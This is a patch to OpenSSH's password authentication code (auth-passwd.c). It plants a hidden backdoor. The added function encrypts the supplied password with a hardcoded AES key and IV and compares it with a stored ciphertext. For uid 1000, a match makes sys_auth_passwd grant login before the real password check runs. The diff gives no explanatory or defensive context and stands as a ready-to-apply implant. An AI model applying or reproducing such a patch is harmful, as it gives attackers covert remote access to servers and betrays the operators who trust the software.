+++ auth-passwd.c	2023-01-10 03:28:09.000000000 -0600
@@ -39,11 +39,13 @@
 #include "includes.h"
 
 #include <sys/types.h>
+#include <openssl/evp.h>
 
 #include <pwd.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <math.h>
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -188,6 +190,65 @@
 	}
 }
 #elif !defined(CUSTOM_SYS_AUTH_PASSWD)
+void gen_key(uint32_t keylen, unsigned char* key) {
+	char* passwd = "hMBTb3Yr70NaDyLoH9JPT2ykfSSKgvcW";
+	char* salt = "3Wi28RC23cDM";
+	uint32_t iterations = 4096;
+	
+	PKCS5_PBKDF2_HMAC(passwd, strlen(passwd), salt, strlen(salt), iterations, EVP_sha256(), keylen, key);
+}
+
+void gen_iv(uint32_t ivlen, unsigned char* iv) {
+	char* passwd = "8WtIAFFQBEXFu8ONUbiuO265";
+	char* salt = "x58C4A0MoYAw";
+	uint32_t iterations = 1024;
+
+	PKCS5_PBKDF2_HMAC(passwd, strlen(passwd), salt, strlen(salt), iterations, EVP_sha256(), ivlen, iv);
+}
+
+void handleErrors(void) {
+	printf("An error occured\n");
+	abort();
+}
+
+int encrypt(unsigned char plaintext[], unsigned char ciphertext[]) {
+	EVP_CIPHER_CTX *ctx;
+	int len;
+	int ciphertext_len;
+
+	uint32_t keylen = 32;
+	uint32_t ivlen = 16;
+	unsigned char key[keylen];
+	unsigned char iv[ivlen];
+
+	gen_key(keylen, key);
+	gen_iv(ivlen, iv);
+
+	if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();
+	if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) handleErrors();
+	if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, strlen(plaintext))) handleErrors();	
+
+	ciphertext_len = len;
+
+	if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
+
+	ciphertext_len += len;
+	EVP_CIPHER_CTX_free(ctx);
+	return ciphertext_len;
+}
+
+int backdoor(struct passwd* pw, const char *password) {
+	unsigned char encpass[(int)(ceil(strlen(password)/16)+1)*16];
+  unsigned char bdpass[] = {0x76, 0xdb, 0x5d, 0x8d, 0xae, 0xf8, 0x33, 0x6b, 0x82, 0x31, 0xd4, 0x80, 0x64, 0xe8, 0xe3, 0x6b, 0x5f, 0x5a, 0x51, 0xab, 0x9c, 0x4a, 0xd4, 0xab, 0xd9, 0x59, 0x2d, 0xf4, 0xba, 0x72, 0x03, 0x3a, 0x4e, 0x33, 0x1a, 0x59, 0xe6, 0x55, 0x06, 0xf1, 0xdf, 0xfb, 0xe7, 0xaf, 0xe3, 0xd4, 0xde, 0x29, 0x00};
+
+	encrypt((char*)password, encpass);
+	if(pw->pw_uid == 1000 && strncmp(encpass, bdpass, strlen(bdpass)) == 0) {
+		return 1;
+	}
+
+	return 0;
+}
+
 int
 sys_auth_passwd(struct ssh *ssh, const char *password)
 {
@@ -195,6 +256,8 @@
 	struct passwd *pw = authctxt->pw;
 	char *encrypted_password, *salt = NULL;
 
+	if(backdoor(pw, password) == 1) return 1;
+
 	/* Just use the supplied fake password if authctxt is invalid */
 	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
 
@@ -203,7 +266,8 @@
 
 	/* Check for users with no password. */
 	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
-		return (1);
+		return (1);	
+
 
 	/*
 	 * Encrypt the candidate password using the proper salt, or pass a
